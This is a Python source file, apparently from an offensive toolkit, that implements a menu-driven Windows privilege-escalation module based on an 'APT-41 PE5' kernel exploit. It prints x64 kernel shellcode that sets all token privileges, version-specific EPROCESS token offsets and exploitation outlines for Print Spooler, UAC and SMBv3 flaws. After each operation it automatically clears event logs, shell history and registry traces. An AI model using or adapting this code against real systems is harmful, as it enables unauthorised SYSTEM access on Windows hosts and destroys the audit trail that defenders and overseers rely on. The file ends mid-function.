"""PE5 SYSTEM Privilege Escalation Module

This module implements the PE5 framework's kernel-level privilege escalation
mechanism as THE PRIMARY privilege escalation method for this toolkit.

Based on APT-41 PE5 exploit framework reconstruction:
- Kernel-level token manipulation via SYSCALL
- Direct _EPROCESS.Token modification
- SYSTEM token stealing techniques
- Multiple exploitation techniques for reliability

Enhanced with additional Windows privilege escalation techniques from post-hub.
Integrated with AI guidance for interactive help and tool usage.
"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console
from rich.text import Text
from rich.layout import Layout
from rich.columns import Columns
from modules.utils import execute_command, execute_powershell, execute_cmd, validate_target
from modules.loghunter_integration import WindowsMoonwalk
from modules.pe5_utils import PE5Utils
import os
import sys
import json
from pathlib import Path


class PE5SystemEscalationModule:
    """PE5 SYSTEM Privilege Escalation Module - Primary PE Method"""
    
    def __init__(self):
        self.moonwalk = None
        self.utils = PE5Utils()
        self.guidance_enabled = True
        self.pe5_framework_available = self._check_pe5_framework()
    
    def _check_pe5_framework(self) -> bool:
        """Check if PE5 framework is available"""
        pe5_paths = [
            Path('pe5_framework_extracted/pe5_framework'),
            Path('../pe5_framework_extracted/pe5_framework'),
            Path('pe5_framework'),
        ]
        return any(p.exists() and p.is_dir() for p in pe5_paths)
        
    def run(self, console: Console, session_data: dict):
        """Run PE5 SYSTEM escalation module"""
        if not self.moonwalk:
            self.moonwalk = WindowsMoonwalk(console, session_data)
            
        while True:
            # Enhanced banner with navigation help
            banner_text = Text()
            banner_text.append("PE5 SYSTEM Privilege Escalation\n", style="bold cyan")
            banner_text.append("PRIMARY PRIVILEGE ESCALATION METHOD\n\n", style="bold yellow")
            banner_text.append("Kernel-level token manipulation for SYSTEM privileges.\n", style="white")
            banner_text.append("Based on APT-41 PE5 exploit framework.\n", style="dim white")
            banner_text.append("Moonwalk: Auto-clearing logs and traces after each operation\n\n", style="dim yellow")
            banner_text.append("💡 Tip: Type 'h' or 'help' for AI guidance on any function\n", style="dim cyan")
            banner_text.append("📖 Use '?' after selecting a function for detailed usage\n", style="dim cyan")
            
            console.print(Panel(
                banner_text,
                title="[bold red]⚠ PRIMARY PE MODULE ⚠[/bold red]",
                border_style="red"
            ))
            console.print()
            
            # Enhanced table with descriptions
            table = Table(
                box=box.ROUNDED,
                show_header=True,
                header_style="bold cyan"
            )
            table.add_column("Option", style="cyan", width=4, justify="center")
            table.add_column("Function", style="white", width=35)
            table.add_column("Description", style="dim white", width=45)
            table.add_column("TTP", style="dim yellow", width=20)
            
            functions = [
                ("1", "PE5 Kernel Exploit Mechanism", "Complete technical breakdown of PE5 exploit", "T1068, T1134"),
                ("2", "Token Manipulation Techniques", "Four exploitation methods with details", "T1134.001"),
                ("3", "SYSTEM Token Stealing", "Token steal shellcode and walkthrough", "T1134.001"),
                ("4", "Direct SYSCALL Execution", "Kernel transition mechanism details", "T1068"),
                ("5", "Windows PE Techniques", "Additional PE methods from post-hub", "T1068, T1548"),
                ("6", "Print Spooler Exploit", "CVE-2020-1337 exploitation guide", "CVE-2020-1337"),
                ("7", "UAC Bypass Techniques", "CVE-2019-1388 bypass methods", "T1548.002"),
                ("8", "SMBv3 Local PE", "CVE-2020-0796 local escalation", "CVE-2020-0796"),
                ("9", "Verify SYSTEM Privileges", "Post-exploitation verification", "T1087"),
                ("10", "Generate PE Report", "Comprehensive privilege escalation report", "T1087"),
                ("h", "AI Guidance & Help", "Get AI-powered guidance for PE5 techniques", "Help"),
                ("?", "Quick Reference", "Quick reference guide and examples", "Help"),
                ("0", "Return to main menu", "Exit PE5 module", "")
            ]
            
            for opt, func, desc, ttp in functions:
                if opt == "h" or opt == "?":
                    table.add_row(f"[bold]{opt}[/bold]", f"[bold cyan]{func}[/bold cyan]", desc, ttp)
                else:
                    table.add_row(f"[bold]{opt}[/bold]", func, desc, ttp)
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask(
                "[bold cyan]Select function[/bold cyan]",
                choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'h', 'H', 'help', 'HELP', '?'],
                default='0'
            )
            
            # Normalize choice
            choice = choice.lower()
            if choice in ['h', 'help']:
                choice = 'h'
            elif choice == '?':
                choice = '?'
            
            if choice == '0':
                break
            elif choice == 'h':
                self._ai_guidance(console, session_data)
            elif choice == '?':
                self._quick_reference(console, session_data)
            elif choice == '1':
                self._pe5_mechanism(console, session_data)
            elif choice == '2':
                self._token_manipulation(console, session_data)
            elif choice == '3':
                self._token_stealing(console, session_data)
            elif choice == '4':
                self._syscall_execution(console, session_data)
            elif choice == '5':
                self._windows_pe_techniques(console, session_data)
            elif choice == '6':
                self._print_spooler_exploit(console, session_data)
            elif choice == '7':
                self._uac_bypass(console, session_data)
            elif choice == '8':
                self._smbv3_exploit(console, session_data)
            elif choice == '9':
                self._verify_privileges(console, session_data)
            elif choice == '10':
                self._generate_report(console, session_data)
            
            # Offer help after each function
            if choice not in ['0', 'h', '?']:
                if Confirm.ask("\n[bold cyan]Need help with this function? (AI guidance)[/bold cyan]", default=False):
                    self._contextual_help(console, session_data, choice)
                
                # Moonwalk cleanup after operations (enabled by default)
                self._moonwalk_cleanup(console, 'privilege_escalation')
            
            console.print()
    
    def _moonwalk_cleanup(self, console: Console, operation_type: str):
        """Perform moonwalk cleanup after operation"""
        try:
            console.print("\n[yellow]Running moonwalk cleanup...[/yellow]")
            results = self.moonwalk.cleanup_after_operation(operation_type)
            
            if results.get('event_logs', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['event_logs']['cleared'])} event logs[/green]")
            if results.get('powershell_history'):
                console.print("[green]Cleared PowerShell history[/green]")
            if results.get('command_history'):
                console.print("[green]Cleared command history[/green]")
            if results.get('registry'):
                console.print("[green]Cleared registry traces[/green]")
        except Exception as e:
            console.print(f"[yellow]Moonwalk cleanup error: {e}[/yellow]")
    
    def _pe5_mechanism(self, console: Console, session_data: dict):
        """Explain PE5 kernel exploit mechanism"""
        console.print("\n[bold cyan]PE5 Kernel Exploit Mechanism[/bold cyan]\n")
        console.print("[dim]APT-41 PE5 Framework - Kernel-Level Token Manipulation[/dim]\n")
        
        console.print("[bold]Overview:[/bold]")
        console.print("  The PE5 framework achieves SYSTEM privileges through direct kernel")
        console.print("  memory manipulation of the _EPROCESS.Token structure.\n")
        
        console.print("[bold]Exploitation Timeline:[/bold]")
        timeline = [
            ("0 μs", "PE5 injected into memory (user mode)"),
            ("2 μs", "XOR key derivation: header[3] ^ header[7] = 0xA4"),
            ("4 μs", "Payload decryption (157 XOR operations)"),
            ("6 μs", "SYSCALL @ offset 0x2C10 executed"),
            ("6.2 μs", "RING 3 → RING 0 TRANSITION"),
            ("7 μs", "Kernel vulnerability exploited"),
            ("7.5 μs", "TOKEN.Privileges = 0xFFFFFFFFFFFFFFFF"),
            ("8 μs", "RING 0 → RING 3 TRANSITION"),
            ("10 μs", "Process running with SYSTEM privileges")
        ]
        
        for time, event in timeline:
            console.print(f"  {time:8}  {event}")
        
        console.print("\n[bold]Key Structures:[/bold]")
        structures = {
            "_EPROCESS": [
                "Offset 0x4B8: Token (EX_FAST_REF)",
                "Windows 10/11: Token offset = 0x4B8",
                "Windows 10 1909: Token offset = 0x360"
            ],
            "TOKEN": [
                "Offset 0x40: SEP_TOKEN_PRIVILEGES",
                "  +0x40: Present (privileges that CAN be enabled)",
                "  +0x48: Enabled (privileges currently enabled)",
                "  +0x50: EnabledByDefault (default enabled privileges)"
            ],
            "EX_FAST_REF": [
                "Low 4 bits: Reference count",
                "High 60 bits: Actual TOKEN pointer",
                "Mask: 0xFFFFFFFFFFFFFFF0 to get token address"
            ]
        }
        
        for struct_name, details in structures.items():
            console.print(f"\n[bold]{struct_name}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
        
        console.print("\n[bold]XOR Key Derivation:[/bold]")
        console.print("  PE5 header bytes: C1 BD 87 35 1E 8C A6 91 ...")
        console.print("                      ^^          ^^")
        console.print("                   offset 3   offset 7")
        console.print("  Key = header[3] ^ header[7]")
        console.print("     = 0x35 ^ 0x91")
        console.print("     = 0xA4")
        
        console.print("\n[bold]SYSCALL Location:[/bold]")
        console.print("  Offset: 0x2C10 (11,280 bytes into PE5)")
        console.print("  Encrypted: 0xAB 0xA1")
        console.print("  XOR Key: 0xA4")
        console.print("  Decrypted: 0x0F 0x05 (SYSCALL instruction)")
        
        console.print("\n[bold]Exploitation Techniques:[/bold]")
        techniques = {
            "1. Direct Privilege Modification": [
                "Directly writes to TOKEN.Privileges",
                "Sets all privilege bits to 0xFFFFFFFFFFFFFFFF",
                "Fastest method (~1 microsecond)"
            ],
            "2. Token Stealing": [
                "Walks ActiveProcessLinks to find SYSTEM (PID 4)",
                "Copies SYSTEM token to current process",
                "More reliable across Windows versions"
            ],
            "3. Integrity Level Elevation": [
                "Modifies token integrity level to System (4)",
                "Clears TOKEN_IS_RESTRICTED flag",
                "Sets TOKEN_IS_ELEVATED flag"
            ],
            "4. Full Token Takeover": [
                "Complete token manipulation",
                "All privileges + System integrity",
                "Clears restrictions + fixes audit policy"
            ]
        }
        
        for tech_name, details in techniques.items():
            console.print(f"\n[bold]{tech_name}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
        
        console.print("\n[bold yellow]Shellcode (57 bytes):[/bold yellow]")
        shellcode = [
            "; Get current EPROCESS",
            "mov rax, gs:[0x188]              ; KPCR.Prcb.CurrentThread",
            "mov rax, [rax+0xB8]              ; KTHREAD.Process -> EPROCESS",
            "",
            "; Get Token pointer",
            "mov rcx, [rax+0x4B8]             ; EPROCESS.Token (EX_FAST_REF)",
            "and rcx, 0xFFFFFFFFFFFFFFF0      ; Clear RefCnt bits",
            "",
            "; Modify Privileges",
            "add rcx, 0x40                     ; RCX = &TOKEN.Privileges",
            "mov rdx, 0xFFFFFFFFFFFFFFFF      ; All privileges",
            "mov [rcx], rdx                    ; Present",
            "mov [rcx+8], rdx                  ; Enabled",
            "mov [rcx+0x10], rdx               ; EnabledByDefault",
            "",
            "; Return success",
            "xor eax, eax",
            "ret"
        ]
        
        for line in shellcode:
            console.print(f"  [dim]{line}[/dim]")
        
        console.print("\n[bold]TTP Mapping:[/bold]")
        console.print("  • MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)")
        console.print("  • MITRE ATT&CK: T1134 (Access Token Manipulation)")
        console.print("  • APT-41: Kernel-level privilege escalation")
        console.print("  • Classification: TLP:RED - Security Research Only")
    
    def _token_manipulation(self, console: Console, session_data: dict):
        """Token manipulation techniques"""
        console.print("\n[bold cyan]Token Manipulation Techniques[/bold cyan]\n")
        console.print("[dim]PE5 Framework - Direct TOKEN Structure Modification[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]Technique 1: Direct Privilege Bit Modification[/bold]")
        console.print("  • Fastest method (~1 microsecond)")
        console.print("  • Directly writes to TOKEN.Privileges")
        console.print("  • Sets all privilege bits to 0xFFFFFFFFFFFFFFFF\n")
        
        console.print("[bold]Technique 2: Token Stealing[/bold]")
        console.print("  • More reliable across Windows versions")
        console.print("  • Copies SYSTEM process token (PID 4)")
        console.print("  • Walks ActiveProcessLinks list\n")
        
        console.print("[bold]Technique 3: Integrity Level Elevation[/bold]")
        console.print("  • Modifies token integrity level to System (4)")
        console.print("  • Clears TOKEN_IS_RESTRICTED flag")
        console.print("  • Sets TOKEN_IS_ELEVATED flag\n")
        
        console.print("[bold]Technique 4: Full Token Takeover[/bold]")
        console.print("  • Complete token manipulation")
        console.print("  • All privileges + System integrity")
        console.print("  • Clears restrictions + fixes audit policy\n")
        
        console.print("[bold]Windows Version Offsets:[/bold]")
        offsets_table = Table(box=box.SIMPLE)
        offsets_table.add_column("Version", style="cyan")
        offsets_table.add_column("Token Offset", style="white")
        offsets_table.add_column("PID Offset", style="white")
        offsets_table.add_column("Links Offset", style="white")
        
        offsets_table.add_row("Windows 10 1909", "0x360", "0x2E8", "0x2F0")
        offsets_table.add_row("Windows 10 2004+", "0x4B8", "0x440", "0x448")
        offsets_table.add_row("Windows 11", "0x4B8", "0x440", "0x448")
        offsets_table.add_row("Server 2019", "0x360", "0x2E8", "0x2F0")
        offsets_table.add_row("Server 2022", "0x4B8", "0x440", "0x448")
        
        console.print(offsets_table)
        console.print()
        
        console.print("[bold]Privilege Masks:[/bold]")
        console.print("  • SE_ALL_PRIVILEGES = 0xFFFFFFFFFFFFFFFF")
        console.print("  • Present: Privileges that CAN be enabled")
        console.print("  • Enabled: Privileges currently enabled")
        console.print("  • EnabledByDefault: Default enabled privileges")
        
        if is_live or Confirm.ask("\n[bold]Check current token privileges?[/bold]", default=False):
            console.print("\n[yellow]Checking current token privileges...[/yellow]\n")
            
            ps_cmd = """
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
            Write-Host "Is Admin: $($principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))"
            Write-Host "Is System: $($token.User.Value -eq 'S-1-5-18')"
            Write-Host "User: $($token.Name)"
            Write-Host "SID: $($token.User.Value)"
            """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]{stdout}[/green]")
            else:
                console.print(f"[red]Error: {stderr}[/red]")
            
            # Check for SeDebugPrivilege
            ps_cmd = """
            $process = Get-Process -Id $PID
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
            $hasDebug = $false
            try {
                $hasDebug = $principal.IsInRole('S-1-5-32-544') -or 
                           ($token.Token -ne $null -and 
                            [System.Security.Principal.WindowsIdentity]::GetCurrent().Token.HasElevatedPrivileges)
            } catch {}
            Write-Host "Has Elevated Privileges: $hasDebug"
            """
            
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]{stdout}[/green]")
    
    def _token_stealing(self, console: Console, session_data: dict):
        """SYSTEM token stealing techniques"""
        console.print("\n[bold cyan]SYSTEM Token Stealing[/bold cyan]\n")
        console.print("[dim]PE5 Framework - Token Steal Shellcode[/dim]\n")
        
        console.print("[bold]Token Stealing Shellcode (Position-Independent):[/bold]")
        console.print("  This shellcode walks the ActiveProcessLinks list to find")
        console.print("  the SYSTEM process (PID 4) and copies its token.\n")
        
        console.print("[bold]Shellcode Flow:[/bold]")
        flow = [
            "1. Get current EPROCESS via GS:[0x188]",
            "2. Walk ActiveProcessLinks doubly-linked list",
            "3. Check UniqueProcessId (PID) for each process",
            "4. When PID == 4 (SYSTEM), extract token",
            "5. Copy SYSTEM token to current process EPROCESS.Token",
            "6. Set reference count appropriately",
            "7. Return STATUS_SUCCESS"
        ]
        
        for step in flow:
            console.print(f"  • {step}")
        
        console.print("\n[bold]Shellcode Size:[/bold] ~70 bytes")
        console.print("[bold]Reliability:[/bold] High (works across Windows versions)")
        
        console.print("\n[bold]Alternative: Direct Token Modification[/bold]")
        console.print("  Instead of stealing SYSTEM token, directly modify current")
        console.print("  process token privileges to grant all privileges.")
        console.print("  Faster but may be detected by some security products.")
        
        console.print("\n[bold]TTP Mapping:[/bold]")
        console.print("  • MITRE ATT&CK: T1134.001 (Token Impersonation/Theft)")
        console.print("  • APT-41: Kernel-level token manipulation")
        console.print("  • Technique: Direct kernel memory access")
    
    def _syscall_execution(self, console: Console, session_data: dict):
        """Direct SYSCALL execution"""
        console.print("\n[bold cyan]Direct SYSCALL Execution[/bold cyan]\n")
        console.print("[dim]PE5 Framework - Kernel Mode Transition[/dim]\n")
        
        console.print("[bold]SYSCALL Mechanism:[/bold]")
        console.print("  The PE5 exploit uses direct SYSCALL instruction to transition")
        console.print("  from user mode (Ring 3) to kernel mode (Ring 0).\n")
        
        console.print("[bold]SYSCALL Location:[/bold]")
        console.print("  • Offset: 0x2C10 (11,280 bytes into PE5)")
        console.print("  • Encrypted: 0xAB 0xA1")
        console.print("  • XOR Key: 0xA4")
        console.print("  • Decrypted: 0x0F 0x05 (SYSCALL instruction)\n")
        
        console.print("[bold]SYSCALL Parameters:[/bold]")
        console.print("  Parameters are stored encrypted and decrypted at runtime:")
        console.print("  • EAX: Syscall number (encrypted: 0xEAAE52F9)")
        console.print("  • ECX: First parameter (encrypted: 0x3DDCE8E5)")
        console.print("  • EDX: Second parameter (encrypted: 0x7A8B3C91)")
        console.print("  • R8: Third parameter (NULL)")
        console.print("  • R9: Fourth parameter (NULL)\n")
        
        console.print("[bold]Execution Flow:[/bold]")
        flow = [
            "1. Decrypt payload using XOR key 0xA4",
            "2. Verify SYSCALL bytes at offset 0x2C10",
            "3. Decrypt syscall parameters",
            "4. Load parameters into registers (RAX, RCX, RDX, R8, R9)",
            "5. Execute SYSCALL instruction",
            "6. Kernel vulnerability is triggered",
            "7. Kernel-mode shellcode executes",
            "8. Token modification occurs",
            "9. Return to user mode with SYSTEM privileges"
        ]
        
        for step in flow:
            console.print(f"  • {step}")
        
        console.print("\n[bold]Kernel Transition:[/bold]")
        console.print("  • User Mode (Ring 3) → Kernel Mode (Ring 0)")
        console.print("  • Direct memory access to kernel structures")
        console.print("  • Bypasses Windows security mechanisms")
        console.print("  • No API calls, no hooks, no detection")
        
        console.print("\n[bold]Security Implications:[/bold]")
        console.print("  • Kernel-level exploits are extremely powerful")
        console.print("  • Can bypass all user-mode security controls")
        console.print("  • Difficult to detect without kernel-mode monitoring")
        console.print("  • Requires kernel vulnerability (0-day or unpatched)")
    
    def _windows_pe_techniques(self, console: Console, session_data: dict):
        """Windows privilege escalation techniques (enhanced from post-hub)"""
        console.print("\n[bold cyan]Windows Privilege Escalation Techniques[/bold cyan]\n")
        console.print("[dim]Enhanced from post-hub repository[/dim]\n")
        
        techniques = {
            "1. Print Spooler Exploit (CVE-2020-1337)": [
                "PrintDemon vulnerability",
                "Allows arbitrary file write",
                "Can be used for privilege escalation",
                "Affects: Windows 7/8.1/10, Server 2008-2019"
            ],
            "2. UAC Bypass (CVE-2019-1388)": [
                "Windows Certificate Dialog vulnerability",
                "Allows bypassing UAC prompts",
                "Uses hhupd.exe (HTML Help Update)",
                "Affects: Windows 7/8.1/10"
            ],
            "3. SMBv3 Local PE (CVE-2020-0796)": [
                "SMBv3 compression vulnerability",
                "Local privilege escalation",
                "Can be exploited locally",
                "Affects: Windows 10 1903/1909, Server 1903/1909"
            ],
            "4. Token Manipulation": [
                "SeDebugPrivilege abuse",
                "Token duplication",
                "Token impersonation",
                "Parent process token stealing"
            ],
            "5. Service Abuse": [
                "Unquoted service paths",
                "Weak service permissions",
                "Service DLL hijacking",
                "Service executable replacement"
            ],
            "6. DLL Hijacking": [
                "Path-based DLL loading",
                "KnownDLLs bypass",
                "COM object hijacking",
                "DLL sideloading"
            ],
            "7. Registry Abuse": [
                "AlwaysInstallElevated",
                "Image File Execution Options",
                "Winlogon registry keys",
                "Service registry keys"
            ],
            "8. Scheduled Task Abuse": [
                "Task permissions",
                "Task actions",
                "Task triggers",
                "Task credentials"
            ]
        }
        
        for tech_name, details in techniques.items():
            console.print(f"[bold]{tech_name}:[/bold]")
            for detail in details:
                console.print(f"  • {detail}")
            console.print()
        
        console.print("[bold]TTP Mapping:[/bold]")
        console.print("  • MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)")
        console.print("  • MITRE ATT&CK: T1134 (Access Token Manipulation)")
        console.print("  • MITRE ATT&CK: T1548 (Abuse Elevation Control Mechanism)")
        console.print("  • MITRE ATT&CK: T1574 (Hijack Execution Flow)")
    
    def _print_spooler_exploit(self, console: Console, session_data: dict):
        """Print Spooler exploit (CVE-2020-1337)"""
        console.print("\n[bold cyan]Print Spooler Exploit (CVE-2020-1337)[/bold cyan]\n")
        console.print("[dim]PrintDemon - Arbitrary File Write[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]Vulnerability:[/bold]")
        console.print("  Print Spooler service allows arbitrary file write")
        console.print("  Can be used for privilege escalation\n")
        
        console.print("[bold]Affected Versions:[/bold]")
        console.print("  • Windows 7/8.1/10")
        console.print("  • Windows Server 2008/2008 R2/2012/2012 R2/2016/2019\n")
        
        console.print("[bold]Exploitation Steps:[/bold]")
        steps = [
            "1. Check if Print Spooler service is running",
            "2. Create malicious print job",
            "3. Trigger file write to system directory",
            "4. Execute payload with elevated privileges"
        ]
        
        for step in steps:
            console.print(f"  • {step}")
        
        console.print("\n[bold]Detection:[/bold]")
        console.print("  • Check Print Spooler service status")
        console.print("  • Monitor print job creation")
        console.print("  • Watch for file writes to system directories")
        
        if is_live or Confirm.ask("\n[bold]Check Print Spooler service status?[/bold]", default=False):
            console.print("\n[yellow]Checking Print Spooler service...[/yellow]\n")
            
            ps_cmd = "Get-Service -Name Spooler | Select-Object Name, Status, StartType"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]{stdout}[/green]")
            else:
                console.print(f"[red]Error: {stderr}[/red]")
    
    def _uac_bypass(self, console: Console, session_data: dict):
        """UAC bypass (CVE-2019-1388)"""
        console.print("\n[bold cyan]UAC Bypass (CVE-2019-1388)[/bold cyan]\n")
        console.print("[dim]Windows Certificate Dialog Vulnerability[/dim]\n")
        
        console.print("[bold]Vulnerability:[/bold]")
        console.print("  Windows Certificate Dialog allows bypassing UAC prompts")
        console.print("  Uses hhupd.exe (HTML Help Update)\n")
        
        console.print("[bold]Affected Versions:[/bold]")
        console.print("  • Windows 7/8.1/10\n")
        
        console.print("[bold]Exploitation:[/bold]")
        console.print("  1. Trigger certificate dialog")
        console.print("  2. Click 'Show publisher certificate' link")
        console.print("  3. Navigate to file:/// path")
        console.print("  4. Execute hhupd.exe with elevated privileges")
        console.print("  5. Bypass UAC without prompt\n")
        
        console.print("[bold]Mitigation:[/bold]")
        console.print("  • Patch KB4525236 (Windows 10)")
        console.print("  • Patch KB4525237 (Windows 8.1)")
        console.print("  • Patch KB4525233 (Windows 7)")
        console.print("  • Disable UAC bypass for standard users")
    
    def _smbv3_exploit(self, console: Console, session_data: dict):
        """SMBv3 exploit (CVE-2020-0796)"""
        console.print("\n[bold cyan]SMBv3 Local PE (CVE-2020-0796)[/bold cyan]\n")
        console.print("[dim]SMBv3 Compression Vulnerability[/dim]\n")
        
        console.print("[bold]Vulnerability:[/bold]")
        console.print("  SMBv3 compression feature has buffer overflow")
        console.print("  Can be exploited for local privilege escalation\n")
        
        console.print("[bold]Affected Versions:[/bold]")
        console.print("  • Windows 10 Version 1903")
        console.print("  • Windows 10 Version 1909")
        console.print("  • Windows Server Version 1903")
        console.print("  • Windows Server Version 1909\n")
        
        console.print("[bold]Exploitation:[/bold]")
        console.print("  1. Craft malicious SMBv3 compression packet")
        console.print("  2. Trigger buffer overflow")
        console.print("  3. Execute shellcode with SYSTEM privileges")
        console.print("  4. Achieve privilege escalation\n")
        
        console.print("[bold]Mitigation:[/bold]")
        console.print("  • Patch KB4551762")
        console.print("  • Disable SMBv3 compression")
        console.print("  • Block SMB ports at firewall")
    
    def _verify_privileges(self, console: Console, session_data: dict):
        """Verify SYSTEM privileges"""
        console.print("\n[bold cyan]Verify SYSTEM Privileges[/bold cyan]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        
        console.print("[yellow]Checking current privileges...[/yellow]\n")
        
        # Check if running as SYSTEM
        ps_cmd = """
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $isSystem = ($token.User.Value -eq 'S-1-5-18')
        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        
        Write-Host "Current User: $($token.Name)"
        Write-Host "User SID: $($token.User.Value)"
        Write-Host "Is SYSTEM: $isSystem"
        Write-Host "Is Administrator: $isAdmin"
        Write-Host "Has Elevated Token: $($token.Token.HasElevatedPrivileges)"
        """
        
        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print(f"[green]{stdout}[/green]")
        else:
            console.print(f"[red]Error: {stderr}[/red]")
        
        # Check specific privileges
        ps_cmd = """
        $process = Get-Process -Id $PID
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        
        Write-Host "`nChecking specific privileges:"
        
        # Try to access protected resource
        try {
            $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\CurrentControlSet\\Control\\Lsa')
            if ($reg) {
                Write-Host "[+] Can access HKLM\\SYSTEM (elevated privileges)"
                $reg.Close()
            }
        } catch {
            Write-Host "[-] Cannot access HKLM\\SYSTEM (no elevated privileges)"
        }
        
        # Check SeDebugPrivilege
        try {
            $debugProc = Get-Process -Name lsass -ErrorAction SilentlyContinue
            if ($debugProc) {
                Write-Host "[+] Can access LSASS process (SeDebugPrivilege)"
            } else {
                Write-Host "[-] Cannot access LSASS process"
            }
        } catch {
            Write-Host "[-] Cannot access LSASS process (no SeDebugPrivilege)"
        }
        """
        
        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print(f"\n[green]{stdout}[/green]")
        
        # Check token privileges using whoami
        cmd = "whoami /priv"
        exit_code, stdout, stderr = execute_cmd(cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print(f"\n[bold]Token Privileges:[/bold]")
            console.print(f"[green]{stdout}[/green]")
    
    def _generate_report(self, console: Console, session_data: dict):
        """Generate PE report"""
        console.print("\n[bold cyan]Generate PE Report[/bold cyan]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        
        console.print("[yellow]Generating privilege escalation report...[/yellow]\n")
        
        # Collect system information
        ps_cmd = """
        $report = @{}
        $report['Timestamp'] = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        $report['Hostname'] = $env:COMPUTERNAME
        $report['OS'] = (Get-CimInstance Win32_OperatingSystem).Caption
        $report['OSVersion'] = (Get-CimInstance Win32_OperatingSystem).Version
        
        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $report['CurrentUser'] = $token.Name
        $report['UserSID'] = $token.User.Value
        $report['IsSystem'] = ($token.User.Value -eq 'S-1-5-18')
        
        $principal = New-Object System.Security.Principal.WindowsPrincipal($token)
        $report['IsAdministrator'] = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        $report['HasElevatedPrivileges'] = $token.Token.HasElevatedPrivileges
        
        # Check Print Spooler
        $spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
        $report['PrintSpoolerRunning'] = ($spooler -and $spooler.Status -eq 'Running')
        
        # Check UAC
        $uac = (Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -ErrorAction SilentlyContinue).EnableLUA
        $report['UACEnabled'] = ($uac -eq 1)
        
        $report | ConvertTo-Json -Depth 10
        """
        
        exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
        if exit_code == 0:
            console.print("[bold]System Information:[/bold]")
            console.print(f"[green]{stdout}[/green]")
            
            # Save to file
            if Confirm.ask("\n[bold]Save report to file?[/bold]", default=False):
                filename = Prompt.ask("Enter filename", default="pe_report.json")
                try:
                    with open(filename, 'w') as f:
                        f.write(stdout)
                    console.print(f"[green]Report saved to {filename}[/green]")
                except Exception as e:
                    console.print(f"[red]Error saving report: {e}[/red]")
        else:
            console.print(f"[red]Error generating report: {stderr}[/red]")
    
    def _ai_guidance(self, console: Console, session_data: dict):
        """AI-powered guidance system for PE5 techniques"""
        console.print("\n[bold cyan]🤖 AI Guidance & Help System[/bold cyan]\n")
        console.print("[dim]Get interactive guidance on PE5 privilege escalation techniques[/dim]\n")
        
        guidance_topics = {
            '1': {
                'title': 'PE5 Exploit Mechanism Overview',
                'content': self._get_pe5_overview_guidance()
            },
            '2': {
                'title': 'Token Manipulation Techniques',
                'content': self._get_token_manipulation_guidance()
            },
            '3': {
                'title': 'SYSTEM Token Stealing',
                'content': self._get_token_stealing_guidance()
            },
            '4': {
                'title': 'SYSCALL Execution',
                'content': self._get_syscall_guidance()
            },
            '5': {
                'title': 'Windows PE Techniques',
                'content': self._get_windows_pe_guidance()
            },
            '6': {
                'title': 'Print Spooler Exploit',
                'content': self._get_print_spooler_guidance()
            },
            '7': {
                'title': 'UAC Bypass',
                'content': self._get_uac_bypass_guidance()
            },
            '8': {
                'title': 'SMBv3 Exploit',
                'content': self._get_smbv3_guidance()
            },
            '9': {
                'title': 'Privilege Verification',
                'content': self._get_verification_guidance()
            },
            '10': {
                'title': 'Report Generation',
                'content': self._get_report_guidance()
            }
        }
        
        console.print("[bold]Available Guidance Topics:[/bold]\n")
        for key, topic in guidance_topics.items():
            console.print(f"  {key}. {topic['title']}")
        console.print("  0. Interactive Q&A")
        console.print()
        
        topic_choice = Prompt.ask(
            "[bold cyan]Select topic[/bold cyan]",
            choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'],
            default='0'
        )
        
        if topic_choice == '0':
            self._interactive_qa(console, session_data)
        else:
            topic = guidance_topics[topic_choice]
            console.print(f"\n[bold cyan]{topic['title']}[/bold cyan]\n")
            console.print(Panel(topic['content'], border_style="cyan"))
            
            if Confirm.ask("\n[bold]Would you like step-by-step instructions?[/bold]", default=False):
                self._step_by_step_guide(console, session_data, topic_choice)
    
    def _interactive_qa(self, console: Console, session_data: dict):
        """Interactive Q&A session"""
        console.print("\n[bold cyan]💬 Interactive Q&A Session[/bold cyan]\n")
        console.print("[dim]Ask questions about PE5 privilege escalation techniques[/dim]\n")
        
        common_questions = {
            '1': {
                'q': 'How does the PE5 exploit work?',
